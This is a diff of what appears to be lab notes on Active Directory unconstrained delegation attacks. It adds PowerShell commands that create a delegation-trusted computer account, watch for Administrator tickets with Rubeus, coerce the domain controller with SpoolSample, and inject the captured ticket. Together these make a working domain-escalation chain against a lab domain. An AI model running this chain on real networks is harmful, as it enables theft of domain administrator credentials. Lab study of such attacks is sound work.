@@ -34,28 +34,27 @@ Resource-Based Constrained Delegation (RBCD)
 ```powershell
 Import-Module ActiveDirectory
 
-# Create Computer Account
-New-ADComputer -Name "UNCON-PC" -SAMAccountName "UNCON-PC" -Enabled $true
+# Create Computer Account - Under the Delegation OU
+New-ADComputer -Name “UNCON-PC” -SAMAccountName “UNCON-PC” -Enabled $true `
+    -Path “OU=Delegation,DC=warzone,DC=oxsium,DC=local”
 
 # Enable unconstrained delegation (TRUSTED_FOR_DELEGATION flag)
-Set-ADAccountControl -Identity "UNCON-PC$" -TrustedForDelegation $true
+Set-ADAccountControl -Identity “UNCON-PC$” -TrustedForDelegation $true
 
 # Check
-Get-ADComputer -Identity "UNCON-PC" -Properties TrustedForDelegation, userAccountControl
+Get-ADComputer -Identity “UNCON-PC” -Properties TrustedForDelegation, userAccountControl
 ```
-<img width="642" height="215" alt="image" src="https://github.com/user-attachments/assets/fff47efd-260f-4739-b802-b2551249bbbe" />
-
----
 ```powershell
-Import-Module PowerView.ps1
+Import-Module .\PowerView.ps1
 
+# Monitor TGTs in the SYSTEM context (on UNCON-PC)
+.\Rubeus.exe monitor /interval:5 /filteruser:Administrator
 
+# Coercion: Force the Domain Controller to authenticate to UNCON-PC
+.\SpoolSample.exe WIN-WARZONE.warzone.oxsium.local UNCON-PC.warzone.oxsium.local
 
-.\Rubeus.exe monitor /interval:5 /filteruser:DOMAIN_ADMIN_NAME
-
-.\SpoolSample.exe DC01 UNCON-PC
-
-.\Rubeus.exe ptt /ticket:base64_ticket_burada
+# Inject the base64 ticket from the Rubeus monitor output
+.\Rubeus.exe ptt /ticket:BASE64_TICKET_HERE
 ```
 
 ---
